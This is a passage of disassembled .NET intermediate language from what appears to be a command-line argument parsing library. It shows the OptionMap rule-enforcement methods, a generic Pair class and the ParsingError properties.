    IL_0050:  ldloc.0
    IL_0051:  ret
  } // end of method OptionMap::get_Item

  .method public hidebysig specialname instance void 
          set_Item(string key,
                   class CommandLine.OptionInfo 'value') cil managed
  {
    // Code size       48 (0x30)
    .maxstack  10
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> CommandLine.OptionMap::_map
    IL_0006:  ldarg.1
    IL_0007:  ldarg.2
    IL_0008:  callvirt   instance void class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo>::set_Item(!0,
                                                                                                                                              !1)
    IL_000d:  ldarg.2
    IL_000e:  callvirt   instance bool CommandLine.OptionInfo::get_HasBothNames()
    IL_0013:  brfalse    IL_002f

    IL_0018:  ldarg.0
    IL_0019:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,string> CommandLine.OptionMap::_names
    IL_001e:  ldarg.2
    IL_001f:  callvirt   instance string CommandLine.OptionInfo::get_LongName()
    IL_0024:  ldarg.2
    IL_0025:  callvirt   instance string CommandLine.OptionInfo::get_ShortName()
    IL_002a:  callvirt   instance void class [mscorlib]System.Collections.Generic.Dictionary`2<string,string>::set_Item(!0,
                                                                                                                        !1)
    IL_002f:  ret
  } // end of method OptionMap::set_Item

  .method private hidebysig specialname instance object 
          get_RawOptions() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      object CommandLine.OptionMap::'<RawOptions>k__BackingField'
    IL_0006:  ret
  } // end of method OptionMap::get_RawOptions

  .method assembly hidebysig specialname 
          instance void  set_RawOptions(object 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      object CommandLine.OptionMap::'<RawOptions>k__BackingField'
    IL_0007:  ret
  } // end of method OptionMap::set_RawOptions

  .method public hidebysig instance bool 
          EnforceRules() cil managed
  {
    // Code size       20 (0x14)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance bool CommandLine.OptionMap::EnforceMutuallyExclusiveMap()
    IL_0006:  brfalse    IL_0012

    IL_000b:  ldarg.0
    IL_000c:  call       instance bool CommandLine.OptionMap::EnforceRequiredRule()
    IL_0011:  ret

    IL_0012:  ldc.i4.0
    IL_0013:  ret
  } // end of method OptionMap::EnforceRules

  .method public hidebysig instance void 
          SetDefaults() cil managed
  {
    // Code size       71 (0x47)
    .maxstack  11
    .locals init ([0] valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo> V_0,
             [1] class CommandLine.OptionInfo V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> CommandLine.OptionMap::_map
    IL_0006:  callvirt   instance class [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection<!0,!1> class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo>::get_Values()
    IL_000b:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<!0,!1> class [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection<string,class CommandLine.OptionInfo>::GetEnumerator()
    IL_0010:  stloc.0
    .try
    {
      IL_0011:  br         IL_002a

      IL_0016:  ldloca.s   V_0
      IL_0018:  call       instance !1 valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>::get_Current()
      IL_001d:  stloc.1
      IL_001e:  ldloc.1
      IL_001f:  ldarg.0
      IL_0020:  call       instance object CommandLine.OptionMap::get_RawOptions()
      IL_0025:  callvirt   instance void CommandLine.OptionInfo::SetDefault(object)
      IL_002a:  ldloca.s   V_0
      IL_002c:  call       instance bool valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>::MoveNext()
      IL_0031:  brtrue.s   IL_0016

      IL_0033:  leave      IL_0046

    }  // end .try
    finally
    {
      IL_0038:  ldloca.s   V_0
      IL_003a:  constrained. valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>
      IL_0040:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0045:  endfinally
    }  // end handler
    IL_0046:  ret
  } // end of method OptionMap::SetDefaults

  .method private hidebysig instance bool 
          EnforceRequiredRule() cil managed
  {
    // Code size       118 (0x76)
    .maxstack  13
    .locals init ([0] valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo> V_0,
             [1] class CommandLine.OptionInfo V_1,
             [2] valuetype [mscorlib]System.Nullable`1<bool> V_2,
             [3] bool V_3)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> CommandLine.OptionMap::_map
    IL_0006:  callvirt   instance class [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection<!0,!1> class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo>::get_Values()
    IL_000b:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<!0,!1> class [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection<string,class CommandLine.OptionInfo>::GetEnumerator()
    IL_0010:  stloc.0
    .try
    {
      IL_0011:  br         IL_0056

      IL_0016:  ldloca.s   V_0
      IL_0018:  call       instance !1 valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>::get_Current()
      IL_001d:  stloc.1
      IL_001e:  ldloc.1
      IL_001f:  callvirt   instance bool CommandLine.OptionInfo::get_Required()
      IL_0024:  brfalse    IL_0056

      IL_0029:  ldloc.1
      IL_002a:  callvirt   instance bool CommandLine.OptionInfo::get_IsDefined()
      IL_002f:  brtrue     IL_0056

      IL_0034:  ldarg.0
      IL_0035:  call       instance object CommandLine.OptionMap::get_RawOptions()
      IL_003a:  ldloc.1
      IL_003b:  ldc.i4.1
      IL_003c:  newobj     instance void valuetype [mscorlib]System.Nullable`1<bool>::.ctor(!0)
      IL_0041:  ldloca.s   V_2
      IL_0043:  initobj    valuetype [mscorlib]System.Nullable`1<bool>
      IL_0049:  ldloc.2
      IL_004a:  call       void CommandLine.OptionMap::BuildAndSetPostParsingStateIfNeeded(object,
                                                                                           class CommandLine.OptionInfo,
                                                                                           valuetype [mscorlib]System.Nullable`1<bool>,
                                                                                           valuetype [mscorlib]System.Nullable`1<bool>)
      IL_004f:  ldc.i4.0
      IL_0050:  stloc.3
      IL_0051:  leave      IL_0074

      IL_0056:  ldloca.s   V_0
      IL_0058:  call       instance bool valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>::MoveNext()
      IL_005d:  brtrue.s   IL_0016

      IL_005f:  leave      IL_0072

    }  // end .try
    finally
    {
      IL_0064:  ldloca.s   V_0
      IL_0066:  constrained. valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>
      IL_006c:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0071:  endfinally
    }  // end handler
    IL_0072:  ldc.i4.1
    IL_0073:  ret

    IL_0074:  ldloc.3
    IL_0075:  ret
  } // end of method OptionMap::EnforceRequiredRule

  .method private hidebysig instance bool 
          EnforceMutuallyExclusiveMap() cil managed
  {
    // Code size       221 (0xdd)
    .maxstack  23
    .locals init ([0] valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo> V_0,
             [1] class CommandLine.OptionInfo V_1,
             [2] valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionMap/MutuallyExclusiveInfo> V_2,
             [3] class CommandLine.OptionMap/MutuallyExclusiveInfo V_3,
             [4] valuetype [mscorlib]System.Nullable`1<bool> V_4,
             [5] bool V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.CommandLineParserSettings CommandLine.OptionMap::_settings
    IL_0006:  callvirt   instance bool CommandLine.CommandLineParserSettings::get_MutuallyExclusive()
    IL_000b:  brtrue     IL_0012

    IL_0010:  ldc.i4.1
    IL_0011:  ret

    IL_0012:  ldarg.0
    IL_0013:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> CommandLine.OptionMap::_map
    IL_0018:  callvirt   instance class [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection<!0,!1> class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo>::get_Values()
    IL_001d:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<!0,!1> class [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection<string,class CommandLine.OptionInfo>::GetEnumerator()
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  br         IL_004d

      IL_0028:  ldloca.s   V_0
      IL_002a:  call       instance !1 valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>::get_Current()
      IL_002f:  stloc.1
      IL_0030:  ldloc.1
      IL_0031:  callvirt   instance bool CommandLine.OptionInfo::get_IsDefined()
      IL_0036:  brfalse    IL_004d

      IL_003b:  ldloc.1
      IL_003c:  callvirt   instance string CommandLine.OptionInfo::get_MutuallyExclusiveSet()
      IL_0041:  brfalse    IL_004d

      IL_0046:  ldarg.0
      IL_0047:  ldloc.1
      IL_0048:  call       instance void CommandLine.OptionMap::BuildMutuallyExclusiveMap(class CommandLine.OptionInfo)
      IL_004d:  ldloca.s   V_0
      IL_004f:  call       instance bool valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>::MoveNext()
      IL_0054:  brtrue.s   IL_0028

      IL_0056:  leave      IL_0069

    }  // end .try
    finally
    {
      IL_005b:  ldloca.s   V_0
      IL_005d:  constrained. valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionInfo>
      IL_0063:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0068:  endfinally
    }  // end handler
    IL_0069:  ldarg.0
    IL_006a:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo> CommandLine.OptionMap::_mutuallyExclusiveSetMap
    IL_006f:  callvirt   instance class [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection<!0,!1> class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>::get_Values()
    IL_0074:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<!0,!1> class [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>::GetEnumerator()
    IL_0079:  stloc.2
    .try
    {
      IL_007a:  br         IL_00bc

      IL_007f:  ldloca.s   V_2
      IL_0081:  call       instance !1 valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>::get_Current()
      IL_0086:  stloc.3
      IL_0087:  ldloc.3
      IL_0088:  callvirt   instance int32 CommandLine.OptionMap/MutuallyExclusiveInfo::get_Occurrence()
      IL_008d:  ldc.i4.1
      IL_008e:  ble        IL_00bc

      IL_0093:  ldarg.0
      IL_0094:  call       instance object CommandLine.OptionMap::get_RawOptions()
      IL_0099:  ldloc.3
      IL_009a:  callvirt   instance class CommandLine.OptionInfo CommandLine.OptionMap/MutuallyExclusiveInfo::get_BadOption()
      IL_009f:  ldloca.s   V_4
      IL_00a1:  initobj    valuetype [mscorlib]System.Nullable`1<bool>
      IL_00a7:  ldloc.s    V_4
      IL_00a9:  ldc.i4.1
      IL_00aa:  newobj     instance void valuetype [mscorlib]System.Nullable`1<bool>::.ctor(!0)
      IL_00af:  call       void CommandLine.OptionMap::BuildAndSetPostParsingStateIfNeeded(object,
                                                                                           class CommandLine.OptionInfo,
                                                                                           valuetype [mscorlib]System.Nullable`1<bool>,
                                                                                           valuetype [mscorlib]System.Nullable`1<bool>)
      IL_00b4:  ldc.i4.0
      IL_00b5:  stloc.s    V_5
      IL_00b7:  leave      IL_00da

      IL_00bc:  ldloca.s   V_2
      IL_00be:  call       instance bool valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>::MoveNext()
      IL_00c3:  brtrue.s   IL_007f

      IL_00c5:  leave      IL_00d8

    }  // end .try
    finally
    {
      IL_00ca:  ldloca.s   V_2
      IL_00cc:  constrained. valuetype [mscorlib]System.Collections.Generic.Dictionary`2/ValueCollection/Enumerator<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>
      IL_00d2:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00d7:  endfinally
    }  // end handler
    IL_00d8:  ldc.i4.1
    IL_00d9:  ret

    IL_00da:  ldloc.s    V_5
    IL_00dc:  ret
  } // end of method OptionMap::EnforceMutuallyExclusiveMap

  .method private hidebysig instance void 
          BuildMutuallyExclusiveMap(class CommandLine.OptionInfo option) cil managed
  {
    // Code size       60 (0x3c)
    .maxstack  8
    .locals init ([0] string V_0)
    IL_0000:  ldarg.1
    IL_0001:  callvirt   instance string CommandLine.OptionInfo::get_MutuallyExclusiveSet()
    IL_0006:  stloc.0
    IL_0007:  ldarg.0
    IL_0008:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo> CommandLine.OptionMap::_mutuallyExclusiveSetMap
    IL_000d:  ldloc.0
    IL_000e:  callvirt   instance bool class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>::ContainsKey(!0)
    IL_0013:  brtrue     IL_002a

    IL_0018:  ldarg.0
    IL_0019:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo> CommandLine.OptionMap::_mutuallyExclusiveSetMap
    IL_001e:  ldloc.0
    IL_001f:  ldarg.1
    IL_0020:  newobj     instance void CommandLine.OptionMap/MutuallyExclusiveInfo::.ctor(class CommandLine.OptionInfo)
    IL_0025:  callvirt   instance void class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>::Add(!0,
                                                                                                                                                              !1)
    IL_002a:  ldarg.0
    IL_002b:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo> CommandLine.OptionMap::_mutuallyExclusiveSetMap
    IL_0030:  ldloc.0
    IL_0031:  callvirt   instance !1 class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>::get_Item(!0)
    IL_0036:  callvirt   instance void CommandLine.OptionMap/MutuallyExclusiveInfo::IncrementOccurrence()
    IL_003b:  ret
  } // end of method OptionMap::BuildMutuallyExclusiveMap

  .method private hidebysig static void  BuildAndSetPostParsingStateIfNeeded(object options,
                                                                             class CommandLine.OptionInfo option,
                                                                             valuetype [mscorlib]System.Nullable`1<bool> required,
                                                                             valuetype [mscorlib]System.Nullable`1<bool> mutualExclusiveness) cil managed
  {
    // Code size       124 (0x7c)
    .maxstack  23
    .locals init ([0] class CommandLine.CommandLineOptionsBase V_0,
             [1] class CommandLine.ParsingError V_1,
             [2] class CommandLine.ParsingError V_2)
    IL_0000:  ldarg.0
    IL_0001:  isinst     CommandLine.CommandLineOptionsBase
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  brtrue     IL_000e

    IL_000d:  ret

    IL_000e:  newobj     instance void CommandLine.ParsingError::.ctor()
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  callvirt   instance class CommandLine.BadOptionInfo CommandLine.ParsingError::get_BadOption()
    IL_001a:  ldarg.1
    IL_001b:  callvirt   instance string CommandLine.OptionInfo::get_ShortName()
    IL_0020:  callvirt   instance void CommandLine.BadOptionInfo::set_ShortName(string)
    IL_0025:  ldloc.1
    IL_0026:  callvirt   instance class CommandLine.BadOptionInfo CommandLine.ParsingError::get_BadOption()
    IL_002b:  ldarg.1
    IL_002c:  callvirt   instance string CommandLine.OptionInfo::get_LongName()
    IL_0031:  callvirt   instance void CommandLine.BadOptionInfo::set_LongName(string)
    IL_0036:  ldloc.1
    IL_0037:  stloc.2
    IL_0038:  ldarga.s   required
    IL_003a:  call       instance bool valuetype [mscorlib]System.Nullable`1<bool>::get_HasValue()
    IL_003f:  brfalse    IL_0051

    IL_0044:  ldloc.2
    IL_0045:  ldarga.s   required
    IL_0047:  call       instance !0 valuetype [mscorlib]System.Nullable`1<bool>::get_Value()
    IL_004c:  callvirt   instance void CommandLine.ParsingError::set_ViolatesRequired(bool)
    IL_0051:  ldarga.s   mutualExclusiveness
    IL_0053:  call       instance bool valuetype [mscorlib]System.Nullable`1<bool>::get_HasValue()
    IL_0058:  brfalse    IL_006a

    IL_005d:  ldloc.2
    IL_005e:  ldarga.s   mutualExclusiveness
    IL_0060:  call       instance !0 valuetype [mscorlib]System.Nullable`1<bool>::get_Value()
    IL_0065:  callvirt   instance void CommandLine.ParsingError::set_ViolatesMutualExclusiveness(bool)
    IL_006a:  ldloc.0
    IL_006b:  callvirt   instance class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::get_InternalLastPostParsingState()
    IL_0070:  callvirt   instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.PostParsingState::get_Errors()
    IL_0075:  ldloc.2
    IL_0076:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>::Add(!0)
    IL_007b:  ret
  } // end of method OptionMap::BuildAndSetPostParsingStateIfNeeded

  .property instance class CommandLine.OptionInfo
          Item(string)
  {
    .get instance class CommandLine.OptionInfo CommandLine.OptionMap::get_Item(string)
    .set instance void CommandLine.OptionMap::set_Item(string,
                                                       class CommandLine.OptionInfo)
  } // end of property OptionMap::Item
  .property instance object RawOptions()
  {
    .get instance object CommandLine.OptionMap::get_RawOptions()
    .set instance void CommandLine.OptionMap::set_RawOptions(object)
  } // end of property OptionMap::RawOptions
} // end of class CommandLine.OptionMap

.class private auto ansi sealed beforefieldinit CommandLine.Pair`2<class TLeft,class TRight>
       extends [mscorlib]System.Object
{
  .field private initonly !TLeft _left
  .field private initonly !TRight _right
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(!TLeft left,
                               !TRight right) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  stfld      !0 class CommandLine.Pair`2<!TLeft,!TRight>::_left
    IL_000d:  ldarg.0
    IL_000e:  ldarg.2
    IL_000f:  stfld      !1 class CommandLine.Pair`2<!TLeft,!TRight>::_right
    IL_0014:  ret
  } // end of method Pair`2::.ctor

  .method public hidebysig specialname instance !TLeft 
          get_Left() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      !0 class CommandLine.Pair`2<!TLeft,!TRight>::_left
    IL_0006:  ret
  } // end of method Pair`2::get_Left

  .method public hidebysig specialname instance !TRight 
          get_Right() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      !1 class CommandLine.Pair`2<!TLeft,!TRight>::_right
    IL_0006:  ret
  } // end of method Pair`2::get_Right

  .method public hidebysig virtual instance int32 
          GetHashCode() cil managed
  {
    // Code size       90 (0x5a)
    .maxstack  8
    .locals init ([0] !TLeft V_0,
             [1] int32 V_1,
             [2] !TRight V_2,
             [3] int32 V_3)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      !0 class CommandLine.Pair`2<!TLeft,!TRight>::_left
    IL_0006:  box        !TLeft
    IL_000b:  brfalse    IL_0029

    IL_0010:  ldarg.0
    IL_0011:  ldfld      !0 class CommandLine.Pair`2<!TLeft,!TRight>::_left
    IL_0016:  stloc.0
    IL_0017:  ldloca.s   V_0
    IL_0019:  constrained. !TLeft
    IL_001f:  callvirt   instance int32 [mscorlib]System.Object::GetHashCode()
    IL_0024:  br         IL_002a

    IL_0029:  ldc.i4.0
    IL_002a:  stloc.1
    IL_002b:  ldarg.0
    IL_002c:  ldfld      !1 class CommandLine.Pair`2<!TLeft,!TRight>::_right
    IL_0031:  box        !TRight
    IL_0036:  brfalse    IL_0054

    IL_003b:  ldarg.0
    IL_003c:  ldfld      !1 class CommandLine.Pair`2<!TLeft,!TRight>::_right
    IL_0041:  stloc.2
    IL_0042:  ldloca.s   V_2
    IL_0044:  constrained. !TRight
    IL_004a:  callvirt   instance int32 [mscorlib]System.Object::GetHashCode()
    IL_004f:  br         IL_0055

    IL_0054:  ldc.i4.0
    IL_0055:  stloc.3
    IL_0056:  ldloc.1
    IL_0057:  ldloc.3
    IL_0058:  xor
    IL_0059:  ret
  } // end of method Pair`2::GetHashCode

  .method public hidebysig virtual instance bool 
          Equals(object obj) cil managed
  {
    // Code size       77 (0x4d)
    .maxstack  2
    .locals init ([0] class CommandLine.Pair`2<!TLeft,!TRight> V_0)
    IL_0000:  ldarg.1
    IL_0001:  isinst     class CommandLine.Pair`2<!TLeft,!TRight>
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  brtrue     IL_000f

    IL_000d:  ldc.i4.0
    IL_000e:  ret

    IL_000f:  ldarg.0
    IL_0010:  ldfld      !0 class CommandLine.Pair`2<!TLeft,!TRight>::_left
    IL_0015:  box        !TLeft
    IL_001a:  ldloc.0
    IL_001b:  ldfld      !0 class CommandLine.Pair`2<!TLeft,!TRight>::_left
    IL_0020:  box        !TLeft
    IL_0025:  call       bool [mscorlib]System.Object::Equals(object,
                                                              object)
    IL_002a:  brfalse    IL_004b

    IL_002f:  ldarg.0
    IL_0030:  ldfld      !1 class CommandLine.Pair`2<!TLeft,!TRight>::_right
    IL_0035:  box        !TRight
    IL_003a:  ldloc.0
    IL_003b:  ldfld      !1 class CommandLine.Pair`2<!TLeft,!TRight>::_right
    IL_0040:  box        !TRight
    IL_0045:  call       bool [mscorlib]System.Object::Equals(object,
                                                              object)
    IL_004a:  ret

    IL_004b:  ldc.i4.0
    IL_004c:  ret
  } // end of method Pair`2::Equals

  .property instance !TLeft Left()
  {
    .get instance !TLeft CommandLine.Pair`2::get_Left()
  } // end of property Pair`2::Left
  .property instance !TRight Right()
  {
    .get instance !TRight CommandLine.Pair`2::get_Right()
  } // end of property Pair`2::Right
} // end of class CommandLine.Pair`2

.class public auto ansi beforefieldinit CommandLine.ParsingError
       extends [mscorlib]System.Object
{
  .field private class CommandLine.BadOptionInfo '<BadOption>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool '<ViolatesRequired>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool '<ViolatesFormat>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool '<ViolatesMutualExclusiveness>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  newobj     instance void CommandLine.BadOptionInfo::.ctor()
    IL_000c:  call       instance void CommandLine.ParsingError::set_BadOption(class CommandLine.BadOptionInfo)
    IL_0011:  ret
  } // end of method ParsingError::.ctor

  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor(string shortName,
                               string longName,
                               bool format) cil managed
  {
    // Code size       27 (0x1b)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  ldarg.2
    IL_0009:  newobj     instance void CommandLine.BadOptionInfo::.ctor(string,
                                                                        string)
    IL_000e:  call       instance void CommandLine.ParsingError::set_BadOption(class CommandLine.BadOptionInfo)
    IL_0013:  ldarg.0
    IL_0014:  ldarg.3
    IL_0015:  call       instance void CommandLine.ParsingError::set_ViolatesFormat(bool)
    IL_001a:  ret
  } // end of method ParsingError::.ctor

  .method public hidebysig specialname instance class CommandLine.BadOptionInfo 
          get_BadOption() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.BadOptionInfo CommandLine.ParsingError::'<BadOption>k__BackingField'
    IL_0006:  ret
  } // end of method ParsingError::get_BadOption

  .method private hidebysig specialname instance void 
          set_BadOption(class CommandLine.BadOptionInfo 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      class CommandLine.BadOptionInfo CommandLine.ParsingError::'<BadOption>k__BackingField'
    IL_0007:  ret
  } // end of method ParsingError::set_BadOption

  .method public hidebysig specialname instance bool 
          get_ViolatesRequired() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.ParsingError::'<ViolatesRequired>k__BackingField'
    IL_0006:  ret
  } // end of method ParsingError::get_ViolatesRequired

  .method public hidebysig specialname instance void 
          set_ViolatesRequired(bool 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.ParsingError::'<ViolatesRequired>k__BackingField'
    IL_0007:  ret
  } // end of method ParsingError::set_ViolatesRequired

  .method public hidebysig specialname instance bool 
          get_ViolatesFormat() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.ParsingError::'<ViolatesFormat>k__BackingField'
    IL_0006:  ret
  } // end of method ParsingError::get_ViolatesFormat

  .method public hidebysig specialname instance void 
          set_ViolatesFormat(bool 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.ParsingError::'<ViolatesFormat>k__BackingField'
    IL_0007:  ret
  } // end of method ParsingError::set_ViolatesFormat

  .method public hidebysig specialname instance bool 
          get_ViolatesMutualExclusiveness() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.ParsingError::'<ViolatesMutualExclusiveness>k__BackingField'
    IL_0006:  ret
  } // end of method ParsingError::get_ViolatesMutualExclusiveness

  .method public hidebysig specialname instance void 
          set_ViolatesMutualExclusiveness(bool 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.ParsingError::'<ViolatesMutualExclusiveness>k__BackingField'
    IL_0007:  ret
  } // end of method ParsingError::set_ViolatesMutualExclusiveness

  .property instance class CommandLine.BadOptionInfo
          BadOption()
  {
    .get instance class CommandLine.BadOptionInfo CommandLine.ParsingError::get_BadOption()
    .set instance void CommandLine.ParsingError::set_BadOption(class CommandLine.BadOptionInfo)
  } // end of property ParsingError::BadOption
  .property instance bool ViolatesRequired()
  {
    .get instance bool CommandLine.ParsingError::get_ViolatesRequired()
    .set instance void CommandLine.ParsingError::set_ViolatesRequired(bool)
  } // end of property ParsingError::ViolatesRequired
  .property instance bool ViolatesFormat()
  {
    .get instance bool CommandLine.ParsingError::get_ViolatesFormat()
